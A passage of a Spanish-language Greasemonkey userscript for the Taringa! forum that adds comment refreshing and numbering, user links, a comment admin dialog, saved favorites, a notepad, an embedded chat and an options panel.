					$('#post-comentarios #comentarios #nuevos').slideDown('slow', function(){
						$('#post-comentarios #comentarios #nuevos').removeAttr('id');
					});
					break;
			}
			add_comment_enviado = false;
			$('.miComentario #gif_cargando').hide('slow');
		},
		error: function(){
			add_comment_enviado = false;
			$('.miComentario #gif_cargando').hide('slow');
			unsafeWindow.mydialog.error_500("add_comment('"+mostrar_resp+"')");
		}
	});
});

var en_comm = false;
Taringa_Set_Function("act_comment", function(pos){
	if(en_comm) return;
	en_comm = true;
	$('.carg_act_comm').attr('src',urlimg+'cargando.gif');
	var url_comm = location.href;
	if(path == 'comunidades'){
		url_comm = 'http://'+Dom+'/comunidades/'+unsafeWindow.global_data.comid+'/'+unsafeWindow.global_data.temaid+'.'+(pos? pos:'ultima')+'/'+location.href.split('/')[6];
	}else{
		url_comm = 'http://'+Dom+'/posts/'+location.href.split('/')[4]+'/'+unsafeWindow.global_data.postid+'.'+(pos? pos:'ultima')+'/'+location.href.split('/')[6];
	}
	
	$.ajax({
		type: "GET",
		url: url_comm,
		success: function(h){
			if(path == 'comunidades'){
				$('#respuestas').html($(h).find('#respuestas').html());
				$('.paginadorCom:last').html($(h).find('.paginadorCom:last').html());
				var rango = $('.comunidadData div[class="box_cuerpo"] b:first').html();
				var users_com = $('.avatar-box ul');
				var nick_user,id_user;
				for(var i=0;i<users_com.size();i++){
					nick_user = users_com.eq(i).find('li:eq(0) a').attr('href').split('/')[3];
					id_user   = /[0-9]+$/.exec(users_com.eq(i).find('li:eq(1)').attr('class'));
					users_com.eq(i).append((rango == "Administrador" || rango == 'Moderador'? '<li class="administrar"><a href="javascript:com.admin_users(\''+id_user+'\')">Administrar Usuario<span></span></a></li>':'')+'<li class="administrar"><a href="/buscador-taringa.php?autor='+nick_user+'" target="_blank">Sus posts<span></span></a></li><li class="administrar"><a href="http://buscar.taringa.net/comunidades?type=temas&q=*&autor='+nick_user+'" target="_blank">Sus temas<span></span></a></li><li class="administrar"><a href="/perfil/'+nick_user+'/comentarios" target="_blank">Sus comentarios<span></span></a></li><li class="administrar"><a href="" onclick="notifica.follow(\'user\', '+id_user+', notifica.userInPostHandle, null);return false;" target="_blank">Seguir Usuario<span></span></a></li>');
				}
				$('.titulorespuestas').append(' <a href="" onclick="act_comment($(\'a[class=here]:first\').html());return false;"> <img src="'+urlimg+'act_comment.png" class="carg_act_comm" title="Actualizar Comentarios" height="15" align="absmiddle" style="margin-left:5px;"/></a>');
				if($('.paginadorCom').size() != 0)
					unsafeWindow.global_data.postid = ($('a[class=here]:first').html() == $('.paginadorCom:first .numbers:last a').html()? 'true':'false');
				else unsafeWindow.global_data.postid = 'true';
				//--Numeración de comentarios--//
				var n_com_ini = 20 * parseInt($('a[class=here]:first').html()) - 20 || 0;
				var n_com = $('.comment-info .nick');for(var i=0;i < n_com.size();i++){n_com.eq(i).before('#'+(i+n_com_ini+1)+' - ');}
				unsafeWindow.com.lastid_resp = $('#respuestas div[id^=id_]:last').attr('id').replace(/id_/,'');
				$('.paginadorCom').css('width','755px').find('ul:first').css('width','500px').parent().css('width','520px');
				$('.paginadorCom ul:last').css('width','500px').parent().css('width','520px');
				$('div[id^=id_][class!=especial1]:has(div.avatar-box a[href=/perfil/'+user+'])').addClass('especial2');
				$('strong:contains("'+user+'")').parent().parent().find('div.citacuerpo:first').addClass('especial2');
			}else{
			  if($(h).find('.post-deleted').size() == 0){
				$('.comentarios-title:first').html($(h).find('.comentarios-title:first').html());
				$('.comentarios-title:last').html($(h).find('.comentarios-title:last').html());
				$('#comentarios').html($(h).find('#comentarios').html());
				if($('.paginadorCom ul').size() > 0)
					$('.paginadorCom ul').append('<li class="numbers"><a class="here" href="" onclick="act_comment($(\'a[class=here]:first\').html());return false;"><img src="'+urlimg+'act_comment.png" class="carg_act_comm" title="Actualizar Comentarios" height="14" /></a></li>');
				else
					$('.titulorespuestas').append(' <a href="" onclick="act_comment($(\'a[class=here]:first\').html());return false;"> <img src="'+urlimg+'act_comment.png" class="carg_act_comm" title="Actualizar Comentarios" height="15" align="absmiddle" style="margin-left:5px;"/></a>');
				var n_com_ini = 100 * parseInt($('a[class=here]:first').html()) - 100 || 0;
				var n_com = $('.comment-info .nick');for(var i=0;i < n_com.size();i++){n_com.eq(i).before('#'+(i+n_com_ini+1)+' - ');}
				$('.paginadorCom div[style]').css('width','620px');
				$('.avatar-48').attr('width','56').attr('height','56');
				if(/^0 Comentarios/.exec($('.titulorespuestas.floatL').html())) $('#comentarios div:last').html($('#comentarios div:last').html().replace(", Soyez le premier", ''));
				else{
					var users_com = $('.avatar-box ul');
					var nick_user,id_user;
					for(var i=0;i<users_com.size();i++){
						nick_user = users_com.eq(i).find('li:eq(0) a').attr('href').split('/')[3];
						id_user   = /[0-9]+$/.exec(users_com.eq(i).find('li:eq(1)').attr('class'));
						users_com.eq(i).append('<li class="administrar"><a href="/buscador-taringa.php?autor='+nick_user+'" target="_blank">Sus posts<span></span></a></li><li class="administrar"><a href="http://buscar.taringa.net/comunidades?type=temas&q=*&autor='+nick_user+'" target="_blank">Sus temas<span></span></a></li><li class="administrar"><a href="/perfil/'+nick_user+'/comentarios" target="_blank">Sus comentarios<span></span></a></li><li class="administrar"><a href="" onclick="notifica.follow(\'user\', '+id_user+', notifica.userInPostHandle, null);return false;" target="_blank">Seguir Usuario<span></span></a></li>');
					}
				}
				$('div[id^=div_cmnt][class!=especial1]:has(div.avatar-box a[href=/perfil/'+user+'])').addClass('especial2');
				$('strong:contains("'+user+'")').parent().parent().addClass('especial2');
			  }else{
				en_comm = false;
				$('.miComentario .error').html($(h).find('.post-deleted h3').html()).show('slow');
				return;
			  }
			}
			modificar_posts();
			$('.before a[class!=desactivado]').click(function(){unsafeWindow.act_comment((parseInt($('a[class=here]:first').html())-1));return false;});
			$('.next a[class!=desactivado]').click(function(){unsafeWindow.act_comment((parseInt($('a[class=here]:first').html())+1));return false;});
			var botonera = $('.paginadorCom').find('li');var lb;
			for(var i=0;i < botonera.size();i++){
				lb = botonera.eq(i).find('a');
				lb.click(function(){unsafeWindow.act_comment(this.innerHTML);return false;});
			}
			$('.comment-info div.floatR ul').append('<li><a href="#maincontainer" title="Ir a la Cielo"><img src="'+urlimg+'arriba.png"/></a></li><li><a href="#pie-a" title="Ir a la Tierra"><img src="'+urlimg+'abajo.png"/></a></li>');
			unsafeWindow.$('img.lazy').lazyload({ placeHolder: 'http://i.t.net.ar/images/space.gif', sensitivity: 300 });
			unsafeWindow.$('div.avatar-box').mouseenter(function(){ $(this).children('ul').show(); }).mouseleave(function(){ $(this).children('ul').hide() });
			en_comm = false;
			$('.carg_act_comm').attr('src',urlimg+'act_comment.png');
		},
		error: function(h){
			$('.carg_act_comm').attr('src',urlimg+'act_comment.png');
			en_comm = false;
		}
	});
});

var en_nov = false;
Taringa_Set_Function("act_post_nov", function(url){
	if(en_nov) return;
	en_nov = true;
	$.ajax({
		type: "GET",
		url: (url? url:'http://'+Dom+'/posts/novatos/'),
		success: function(h){
			secc_nov = $(h).find('#izquierda').html();
			$('#derecha').fadeOut('slow',function(){
				$('#derecha').html(secc_nov);
				$("div[class='box_txt ultimos_posts']:last").html('Post de Novatos <a href="" onclick="act_post_nov();return false;" title="Actualizar Post" > <img src="'+urlimg+'act_comment.png" align="top" height="16" width="16" /></a>');
				var ant = $('#derecha div[class=size13] a:contains(« Anterior)');
				var sig = $('#derecha div[class=size13] a:contains(Siguiente »)');
				if(ant.size() != 0){
					ant.css('font-weight','bold');
					ant.attr('url', ant.attr('href'));
					ant.click(function(){unsafeWindow.act_post_nov(ant.attr('url'));return false;});
					ant.attr('href','');
				}
				if(sig.size() != 0){
					sig.css('font-weight','bold');
					sig.attr('url', sig.attr('href'));
					sig.click(function(){unsafeWindow.act_post_nov(sig.attr('url'));return false;});
					sig.attr('href','');
				}
				secc_nov = null;
			}).fadeIn('slow',function(){
				en_nov = false;
			});
		},
		error: function(h){
			en_nov = false;
		}
	});
});
var en_nfu = false;
Taringa_Set_Function("act_post_nfu", function(url){
	if(en_nfu) return;
	en_nfu = true;
	$.ajax({
		type: "GET",
		url: (url? url:'http://'+Dom+'/'),
		success: function(h){
			$('#izquierda').fadeOut('slow',function(){
				$('#izquierda').html($(h).find('#izquierda').html());
				$('#topsPostBox').html($(h).find('#topsPostBox').html());
				$('#lastCommBox').html($(h).find('#lastCommBox').html());
				$('#ult_comm').html($(h).find('#ult_comm').html());
				$("div[class='box_txt ultimos_posts']:first").html('Últimos posts <a href="" onclick="act_post_nfu();return false;" title="Actualizar Post" > <img src="'+urlimg+'act_comment.png" align="top" height="16" width="16" /></a>');
				var ant = $('#izquierda div[class=size13] a:contains(« Anterior)');
				var sig = $('#izquierda div[class=size13] a:contains(Siguiente »)');
				if(ant.size() != 0){
					ant.attr('url', ant.attr('href'));
					ant.click(function(){unsafeWindow.act_post_nfu(ant.attr('url'));return false;});
					ant.attr('href','');
				}
				if(sig.size() != 0){
					sig.attr('url', sig.attr('href'));
					sig.click(function(){unsafeWindow.act_post_nfu(sig.attr('url'));return false;});
					sig.attr('href','');
				}
			}).fadeIn('slow',function(){
				en_nfu = false;
			});
		},
		error: function(h){
			en_nfu = false;
		}
	});
});

Taringa_Set_Function("administrar_post", function(key, numpost){
	GM_addStyle('.Sharkale_cargando {display:none;}');
	$.ajax({
		type: 'GET',
		url: 'http://'+Dom+'/api/shark32455Dfa/json/Posts-GetPostComments/'+numpost,
		success: function(h){
			var comment = new Function("return "+h)();
			if($('#SharkaleAdmPost').size() == 0){
				var div = $('<div id="SharkaleAdmPost"><div id="SharkaleAdmTexto"></div></div>');
				$('body').before(div);
			}
			if(comment["error"]) {
				$('#SharkaleAdmTexto').html("<b>Error al obtener datos del post.<br /><br />Número de error: "+comment["error"]["code"]+"<br />Razón: "+comment["error"]["msg"]+"</b>");
				if($('SharkaleAdmPost').size() == 0) $('#SharkaleAdmPost').dialog({title: 'Error al cargar el Administrador de Post - yasserock® rulez!',width: 900, modal: true, position:['center',30], resizable: false, draggable: false });
				comment = null;
				return;
			}
			var HTML = '<hr>';
			for(var i in comment){
				HTML = '<hr><div id="Sharkale_div_cmnt_'+comment[i]["comment-id"]+'"><a href="" onclick="borrar_com('+comment[i]["comment-id"]+');$(\'#Sharkale_div_cmnt_'+comment[i]["comment-id"]+'\').slideUp(\'slow\');return false;"><img title="Borrar Comentario" alt="borrar" src="http://i.t.net.ar/images/borrar.png"></a> <span id="Sharkale_cmnt_'+comment[i]["comment-id"]+'"><strong>'+comment[i]["nick"]+'</strong></span> | '+comment[i]["date"]+' dijo:<br />'+comment[i]["comment"]+'</div>'+HTML;
			}
			HTML = '<div style="font-size: 11px; text-align:center;"><a href="#abajo" id="arriba"> <img src="'+urlimg+'abajo.png" align="top" height="16" width="16" /> <strong>Ir a la Tierra</strong></a> | <a href="" onclick="administrar_post(\''+key+'\',\''+numpost+'\');return false;"> <img src="'+urlimg+'act_comment.png" align="top" height="16" width="16" /> <strong>Actualizar Comentarios</strong></a></div><span class="Sharkale_cargando"><img src="'+URL+'cargando.gif" width="16" height="16" align="absmiddle"/> Por favor espere...</span>'+HTML;
			HTML += '<div style="font-size: 11px; text-align:center;"><a href="#arriba" id="abajo"> <img src="'+urlimg+'arriba.png" align="top" height="16" width="16" /> <strong>Ir al Cielo</strong></a> | <a href="" onclick="administrar_post(\''+key+'\',\''+numpost+'\');return false;"> <img src="'+urlimg+'act_comment.png" align="top" height="16" width="16" /> <strong>Actualizar Comentarios</strong></a></div>';
			$('#SharkaleAdmTexto').html(HTML);
			document.documentElement.scrollTop = 0;
			unsafeWindow.global_data.postid = numpost;
			unsafeWindow.global_data.user_key = key;
			if($('div[role="dialog"]').size() == 0 || $('#SharkaleAdmPost').is(':hidden'))$('#SharkaleAdmPost').dialog({title: 'Administrador de Post - yasserock® rulez!',width: 900, modal: true, position:['center',30], resizable: false, draggable: false });
		},
		error: function(h){
			alert("No se pudo consultar los datos del post. Intente nuevamente más tarde.");
		}
	});
});

Taringa_Set_Function("JS_miarrobatag207890", function(cual){
	mensaje = ''
	cual.miarrobatag207890_msg.value = jQuery.trim(cual.miarrobatag207890_msg.value);
	if( cual.miarrobatag207890_msg.value.length > 250) mensaje += '+ El mensaje es demasiado largo\n';
	if( cual.miarrobatag207890_msg.value=='' || cual.miarrobatag207890_msg.value=='Tu mensaje aquí' ) mensaje += '+ Tienes que escribir el mensaje\n';
	cual.miarrobatag207890_nick.value = jQuery.trim(cual.miarrobatag207890_nick.value).replace(/^[\._\-]*/, '').replace(/[\._\-]*$/, '').replace(/^.+([\._\-]{2}).+$/gi,'');
	if( mensaje!='' ){
		alert('Se han producido los siguientes errores:\n'+mensaje);
		return false;
	}else{
		cual.miarrobatag207890_msg_tmp.value = cual.miarrobatag207890_msg.value;
		cual.miarrobatag207890_msg.value = 'Tu mensaje aquí';
		cual.miarrobatag207890_nick_tmp.value = cual.miarrobatag207890_nick.value;
		return true;
	}
});

Taringa_Set_Function("Abrir_Juego", function(pagina) {
    var opciones="toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, width=740, height=480";
    window.open(pagina,"juego",opciones);
});

Taringa_Set_Function("admin_user", function() {
	unsafeWindow.mydialog.procesando_inicio("Buscando Usuario...","Administrador de Usuario");
	var nick = $('#nick_admin_user').val();
	$.ajax({
		type: 'GET',
		url: 'http://'+Dom+'/perfil/'+nick,
		success: function(h){
			h = h.replace(/<img [^>]*>/gi,'');
			if($(h).find('div[class=box_cuerpo]:contains(no existe)').size() != 0){
				unsafeWindow.mydialog.alert('Administrador de Usuario','El usuario <b>' + nick +'</b> no existe.<br>Compruebe el nombre de usuario y pruebe nuevamente.');
			}else{
				var id = $(h).find('.sRss:first').attr('href').split('/')[3];
				unsafeWindow.com.admin_users(id);
			}
			unsafeWindow.mydialog.center();
		},
		complete: function(){
			unsafeWindow.mydialog.procesando_fin();
		}
	});
});
window.block_notas = GM_getValue("notas","");
Taringa_Set_Function("block_notas", function() {
	$('#cuerpocontainer').hide();
	GM_addStyle('#widget textarea{width:935px;height:'+(window.innerHeight-220)+'px;}');
	var widget = '<div id="widget" align="center" style="display: block; position: relative; overflow: hidden; outline: 0px none; height: auto; width: 954px;" class="ui-dialog ui-widget ui-widget-content ui-corner-all " tabindex="-1" role="dialog" aria-labelledby="ui-dialog-title-SharkaleOpciones">';
	var nuevaHTML = '<div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix" style="-moz-user-select: none;margin-bottom:3px;">';
	nuevaHTML += '	<span class="ui-dialog-title" id="ui-dialog-title-SharkaleOpciones" unselectable="on" style="-moz-user-select: none;">Block de Notas del Script - yasserock&reg; rulez!</span>';
	nuevaHTML += '	<a href="" onclick="$(\'#widget\').remove();$(\'#cuerpocontainer\').show();return false;" onmouseover="$(this).addClass(\'ui-state-hover\');" onmouseout="$(this).removeClass(\'ui-state-hover\');" class="ui-dialog-titlebar-close ui-corner-all" unselectable="on" style="-moz-user-select: none;">';
	nuevaHTML += '		<span class="ui-icon ui-icon-closethick" unselectable="on" style="-moz-user-select: none;">close</span>';
	nuevaHTML += '	</a>';
	nuevaHTML += '</div>';
	nuevaHTML += '<textarea></textarea></div>';
	if($('#widget').size() == 0) $('#cuerpocontainer').before(widget+nuevaHTML+'</div>'); else $('#widget').html(nuevaHTML);
	$('#widget textarea').html(block_notas);
	
	function guardar() {
	    GM_setValue("notas", $('#widget textarea').val());
		block_notas = $('#widget textarea').val();
    }
	$('#widget textarea').bind('keyup', guardar);
});

Taringa_Set_Function("chat_script", function() {
	$('#cuerpocontainer').hide();
	var widget = '<div id="widget" align="center" style="display: block; position: relative; overflow: hidden; outline: 0px none; height: auto; width: 954px;" class="ui-dialog ui-widget ui-widget-content ui-corner-all " tabindex="-1" role="dialog" aria-labelledby="ui-dialog-title-SharkaleOpciones">';
	var nuevaHTML = '<div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix" style="-moz-user-select: none;margin-bottom:3px;">';
	nuevaHTML += '	<span class="ui-dialog-title" id="ui-dialog-title-SharkaleOpciones" unselectable="on" style="-moz-user-select: none;">Chat Oficial del Script - yasserock&reg; rulez!</span>';
	nuevaHTML += '	<a href="" onclick="$(\'#widget\').remove();$(\'#cuerpocontainer\').show();return false;" onmouseover="$(this).addClass(\'ui-state-hover\');" onmouseout="$(this).removeClass(\'ui-state-hover\');" class="ui-dialog-titlebar-close ui-corner-all" unselectable="on" style="-moz-user-select: none;">';
	nuevaHTML += '		<span class="ui-icon ui-icon-closethick" unselectable="on" style="-moz-user-select: none;">close</span>';
	nuevaHTML += '	</a>';
	nuevaHTML += '</div>';
	nuevaHTML += '<embed src="http://www.xatech.com/web_gear/chat/chat.swf" quality="high" width="728" height="486" name="chat" FlashVars="id=93592915&rl=Argentina" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://xat.com/update_flash.shtml" />';
	if($('#widget').size() == 0) $('#cuerpocontainer').before(widget+nuevaHTML+'</div>'); else $('#widget').html(nuevaHTML);
});

}

function CrearFavsGuardados(){
	var nuevaHTML = '';
	var favs = GM_getValue('temasFavs', '').split('//#//');
	var c=0;
	for (var i = 0; i < favs.length-1; i=i+3){
		c++;
		nuevaHTML += '<tr pos="'+c+'"><td></td><td style="text-align: left;"><a class="titlePost" href="'+Base64.decode(favs[i+1])+'" temaid="'+favs[i]+'">'+Base64.decode(favs[i+2])+'</a></td><td></td><td></td><td></td><td></td><td><a href="" onclick="return false;" name="borrar_tema_favs" pos="'+c+'" title="Borrar BBCode"><img title="Borrar Favorito" alt="X" src="http://i.t.net.ar/images/borrar.png"></a></td></tr>';
	}
	return nuevaHTML;
}

function add_favs_tema(temaid){
	var aguardar = temaid+'//#//'+Base64.encode(location.href)+'//#//'+Base64.encode($('head title').html().replace(/^Taringa! - /,''));
	var favs = GM_getValue('temasFavs','');
	if(favs != ''){
		favs = favs.split('//#//');
		for (var i = 0; i < favs.length-1; i=i+3){
			if(favs[i] == temaid){
				unsafeWindow.mydialog.alert("Favoritos de Comunidades - yasserock® rulez!",'Esta tema ya esta guardado en favoritos.');
				return;
			}
		}
		GM_setValue('temasFavs',favs.join('//#//')+'//#//'+aguardar);
		unsafeWindow.mydialog.alert("Favoritos de Comunidades - yasserock® rulez!",'El tema fue guardado correctamente!');
	}else{
		unsafeWindow.mydialog.alert("Favoritos de Comunidades - yasserock® rulez!",'El tema fue guardado correctamente!');
		GM_setValue('temasFavs',aguardar);
	}
}

function borrar_favs_tema(pos){
	var temaid = $('tr[pos='+pos+'] a[class=titlePost]').attr('temaid');
	var favs = GM_getValue('temasFavs','');
	favs = favs.split('//#//');
	var auxfavs = '';
	for (var i = 0; i < favs.length-1; i=i+3){
		if(favs[i] != temaid){
			if(auxfavs != '') auxfavs = '//#//'+favs[i]+'//#//'+favs[i+1]+'//#//'+favs[i+2]
			else auxfavs = favs[i]+'//#//'+favs[i+1]+'//#//'+favs[i+2]
		}
	}
	GM_setValue('temasFavs',auxfavs);
	$('tr[pos='+pos+']').fadeOut('slow');
}

function filtro_favs_temas(){
	if(GM_getValue('temasFavs','') != ''){
		$('#resultados table tbody').html(CrearFavsGuardados());
		var Btn_borrar = $('a[name=borrar_tema_favs]');
		for(var i=0; i < Btn_borrar.size(); i++){
			Btn_borrar.eq(i).click(function(){borrar_favs_tema($(this).attr('pos'));});
		}
	}else $('#resultados table tbody').html('<tr><td colspan="7" style="font-weight:bold">No hay temas de las comunidades en favoritos.</td></tr>');
};

// ==URL de Imagenes==
var MenuTaringa = GM_getValue("MT", urlimg+'taringa.png');
var MenuMensajesVacio = GM_getValue("MMV", urlimg+'Smv.png');
var MenuMensajesLleno = GM_getValue("MML", urlimg+'Sml.png');
var MenuMonitor = GM_getValue("MM", urlimg+'Sm.png');
var MenuFavoritos = GM_getValue("MF", urlimg+'Sf.png');
var MenuCuenta = GM_getValue("MC", urlimg+'Smc.png');
var MenuCerrarSesion = GM_getValue("MCS", urlimg+'Scs.png');
var MenuBorradores = GM_getValue("MB", urlimg+'Sb.png');
var MenuOpciones = GM_getValue("MO", urlimg+'opciones.png');
var MenuActualizacion = GM_getValue("MA", urlimg+'actualizar.png');
if (GM_getValue("mostarMiEstado"))
	var MenuOnlineOffline = GM_getValue("MOO", 'http://s3.subirimagenes.com:81/emoticonos/previo/thump_4862793bul186.gif');
else
	var MenuOnlineOffline = GM_getValue("MOO", 'http://s2.subirimagenes.com/emoticonos/previo/thump_48705234862805bul187.gif');
var MenuSize = GM_getValue("MS", "21");
// ==/URL de Imagenes==
function Guardar_Opciones(){
	GM_setValue("aSWF",($("#shark_aSWF").attr("checked")?true:false));
	GM_setValue("aSWFhide",($("#shark_aSWFhide").attr("checked")?true:false));
	GM_setValue("PunFav",($("#shark_PunFav").attr("checked")?true:false));
	GM_setValue("EmotVis",($("#shark_EmotVis").attr("checked")?true:false));
	GM_setValue("LinkCheck",($("#shark_LinkCheck").attr("checked")?true:false));
	GM_setValue("NovatosPrinc",($("#shark_NovatosPrinc").attr("checked")?true:false));
	GM_setValue("CambiarTheme",($("#shark_CambiarTheme").attr("checked")?true:false));
	GM_setValue("HideComment",($("#shark_HideComment").attr("checked")?true:false));
	aSWF = GM_getValue("aSWF",true);
	aSWFhide = GM_getValue("aSWFhide",true);
	PunFav = GM_getValue("PunFav",true);
	EmotVis = GM_getValue("EmotVis",true);
	LinkCheck = GM_getValue("LinkCheck",true);
	NovatosPrinc = GM_getValue("NovatosPrinc",true);
	CambiarTheme = GM_getValue("CambiarTheme",true);
	HideComment = GM_getValue("HideComment",false);
	$('#mensaje-opciones').slideDown("Slow");
	$.timer(5000, function(timer){
		$('#mensaje-opciones').slideUp("Slow");
		timer.stop();
	});
}
function Guardar_Imagenes(){
	$('#previe-mt').attr('src',$('#mt-url').attr('value'));
	$('#previe-mmv').attr('src',$('#mmv-url').attr('value'));
	$('#previe-mml').attr('src',$('#mml-url').attr('value'));
	$('#previe-mm').attr('src',$('#mm-url').attr('value'));
	$('#previe-mf').attr('src',$('#mf-url').attr('value'));
	$('#previe-mc').attr('src',$('#mc-url').attr('value'));
	$('#previe-mcs').attr('src',$('#mcs-url').attr('value'));
	$('#previe-mb').attr('src',$('#mb-url').attr('value'));
	$('#previe-mo').attr('src',$('#mo-url').attr('value'));
	$('#previe-ma').attr('src',$('#ma-url').attr('value'));
	MenuTaringa = $('#mt-url').attr('value');
	MenuMensajesVacio = $('#mmv-url').attr('value');
	MenuMensajesLleno = $('#mml-url').attr('value');
	MenuMonitor = $('#mm-url').attr('value');
	MenuFavoritos = $('#mf-url').attr('value');
	MenuCuenta = $('#mc-url').attr('value');
	MenuCerrarSesion = $('#mcs-url').attr('value');
	MenuBorradores = $('#mb-url').attr('value');
	MenuOpciones = $('#mo-url').attr('value');
	MenuActualizacion = $('#ma-url').attr('value');
	MenuOnlineOffline = $('#moo-url').attr('value');
	MenuSize = $(':radio[name="ms"][checked]').val();
	GM_setValue("MT", MenuTaringa);
	GM_setValue("MMV", MenuMensajesVacio);
	GM_setValue("MML", MenuMensajesLleno);
	GM_setValue("MM", MenuMonitor);
	GM_setValue("MF", MenuFavoritos);
	GM_setValue("MC", MenuCuenta);
	GM_setValue("MCS", MenuCerrarSesion);
	GM_setValue("MB", MenuBorradores);
	GM_setValue("MO", MenuOpciones);
	GM_setValue("MA", MenuActualizacion);
	GM_setValue("MS", MenuSize);
	GM_setValue("MOO",MenuOnlineOffline);
	$('#mensaje-imagenes').slideDown("Slow");
	$.timer(5000, function(timer){
		$('#mensaje-imagenes').slideUp("Slow");
		timer.stop();
	});
}
function Restablecer_Imagenes(){
	$('#mt-url').val(urlimg+'taringa.png');
	$('#mmv-url').val(urlimg+'Smv.png');
	$('#mml-url').val(urlimg+'Sml.png');
	$('#mm-url').val(urlimg+'Sm.png');
	$('#mf-url').val(urlimg+'Sf.png');
	$('#mc-url').val(urlimg+'Smc.png');
	$('#mcs-url').val(urlimg+'Scs.png');
	$('#mb-url').val(urlimg+'Sb.png');
	$('#mo-url').val(urlimg+'opciones.png');
	$('#ma-url').val(urlimg+'actualizar.png');
	$(':radio[value=21]').attr("checked", "checked");
	Guardar_Imagenes();
}
function Restablecer_Imagenes_T(){
	$('#mt-url').val(urlimg+'taringa.png');
	$('#mmv-url').val(urlimg+'Tmv.png');
	$('#mml-url').val(urlimg+'Tml.png');
	$('#mm-url').val(urlimg+'Tm.png');
	$('#mf-url').val(urlimg+'Tf.png');
	$('#mc-url').val(urlimg+'Tmc.png');
	$('#mcs-url').val(urlimg+'Tcs.png');
	$('#mb-url').val(urlimg+'Tb.png');
	$('#mo-url').val(urlimg+'opciones.png');
	$('#ma-url').val(urlimg+'actualizar.png');
	$(':radio[value=17]').attr("checked", "checked");
	Guardar_Imagenes();
}

function Sharkale_Opciones(){
	var widget = '<div id="widget" style="display: block; position: relative; overflow: hidden; outline: 0px none; height: auto; width: 954px;" class="ui-dialog ui-widget ui-widget-content ui-corner-all " tabindex="-1" role="dialog" aria-labelledby="ui-dialog-title-SharkaleOpciones">';
	var nuevaHTML = '<div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix" style="-moz-user-select: none;margin-bottom:3px;">';
	nuevaHTML += '	<span class="ui-dialog-title" id="ui-dialog-title-SharkaleOpciones" unselectable="on" style="-moz-user-select: none;">Opciones Avanzadas del Script - yasserock&reg; rulez!</span>';
	nuevaHTML += '	<a href="" onclick="$(\'#widget\').remove();$(\'#cuerpocontainer\').show();return false;" onmouseover="$(this).addClass(\'ui-state-hover\');" onmouseout="$(this).removeClass(\'ui-state-hover\');" class="ui-dialog-titlebar-close ui-corner-all" unselectable="on" style="-moz-user-select: none;">';
	nuevaHTML += '		<span class="ui-icon ui-icon-closethick" unselectable="on" style="-moz-user-select: none;">close</span>';
	nuevaHTML += '	</a>';
	nuevaHTML += '</div>';
	nuevaHTML += '<div id="tabs">';
	nuevaHTML += '<ul>';
	nuevaHTML += '    <li><a href="#opciones-1"><span>Opciones</span></a></li>';
	nuevaHTML += '    <li><a href="#opciones-2"><span>Tagboard</span></a></li>';
	nuevaHTML += '    <li><a href="#opciones-3"><span>Chat</span></a></li>';
	nuevaHTML += '    <li><a href="#opciones-4"><span>Publicidad y Varios</span></a></li>';
	nuevaHTML += '    <li><a href="#opciones-5"><span>Changelog</span></a></li>';
	nuevaHTML += '    <li><a href="#opciones-6"><span>Acerca de...</span></a></li>';
	nuevaHTML += '</ul>';
	nuevaHTML += '<div id="opciones-1">';
	nuevaHTML += ' <div id="tabsOpciones">';
	nuevaHTML += '  <ul>';
	nuevaHTML += '    <li><a href="#imagenes-1"><span>Opciones Generales</span></a></li>';
	nuevaHTML += '    <li><a href="#imagenes-2"><span>Imágenes del Menú</span></a></li>';
	nuevaHTML += '    <li><a href="#imagenes-3"><span>Emoticones personalizados</span></a></li>';
	nuevaHTML += '  </ul>';
	nuevaHTML += '  <div id="imagenes-1"><b>';
	nuevaHTML += '    <div class="ui-state-error ui-corner-all" style="padding: 0pt 0.7em;"><p><span class="ui-icon ui-icon-alert" style="float: left; margin: 0.3em 0.3em;"></span><span style="font-size: 14px;">Si queres donar por medio de PayPal mandame MP y te digo a que cuenta transferir <a href="http://www.taringa.net/mensajes/a/yasserock"><img src="https://www.paypal.com/es_ES/ES/i/btn/btn_donate_LG.gif" align="absmiddle" alt="PayPal. La forma rápida y segura de pagar en Internet."></a></span></p></div>';
	nuevaHTML += '  <br><div id="switcher"></div><br>';
	nuevaHTML += '	<label><input type="checkbox" id="shark_PunFav" '+(PunFav? 'checked':'')+'> Agregar Puntos y Favoritos en la sección de Comentarios</label><br/>';
	nuevaHTML += '	<label><input type="checkbox" id="shark_aSWF" '+(aSWF? 'checked':'')+' onchange="if ($(this).is(\':checked\')) {$(\'#shark_aSWFhide\').removeAttr(\'disabled\').removeClass(\'ui-state-disabled\')}else{$(\'#shark_aSWFhide\').attr(\'disabled\', true).addClass(\'ui-state-disabled\')}"> Agrandar archivos Flash.</label><br/>';
	nuevaHTML += '	<label style="margin-left: 12px"><input type="checkbox" id="shark_aSWFhide" '+(aSWFhide? 'checked':'')+(!aSWF? 'disabled="disabled" style="ui-state-disabled"':'')+'> Ocultar archivos Flash por defecto.</label><br/>';
	nuevaHTML += '	<label><input type="checkbox" id="shark_EmotVis" '+(EmotVis? 'checked':'')+'> Mostrar Emoticones por defecto.</label><br/>';
	nuevaHTML += '	<label><input type="checkbox" id="shark_LinkCheck" '+(LinkCheck? 'checked':'')+'> Ejecutar LinkChecker automáticamebte. De lo contrario un botón aparecerá junto al título para la ejecución manual.</label><br/>';
	nuevaHTML += '	<label><input type="checkbox" id="shark_NovatosPrinc" '+(NovatosPrinc? 'checked':'')+'> Post de Novatos en la Página Principal.</label><br/>';
	nuevaHTML += '	<label><input type="checkbox" id="shark_HideComment" '+(HideComment? 'checked':'')+'> Ocultar comentarios de los post por defecto.</label><br/>';
	nuevaHTML += '	<label><input type="checkbox" id="shark_CambiarTheme" '+(CambiarTheme? 'checked':'')+' onchange="if ($(this).is(\':checked\')) {$(\'#Btn_CambiarTheme\').removeAttr(\'disabled\').removeClass(\'ui-state-disabled\')}else{$(\'#Btn_CambiarTheme\').attr(\'disabled\', true).addClass(\'ui-state-disabled\')}"> Activar cambiador de Theme de Taringa! y Poringa!.</label><br/>';
	nuevaHTML += '	<br/><input type="button" class="ui-state-default ui-corner-all'+(!CambiarTheme? ' ui-state-disabled':'')+'" id="Btn_CambiarTheme" '+(!CambiarTheme? 'disabled="disabled"':'')+' value="Cambiar Theme de Taringa!"><br/><br/>';
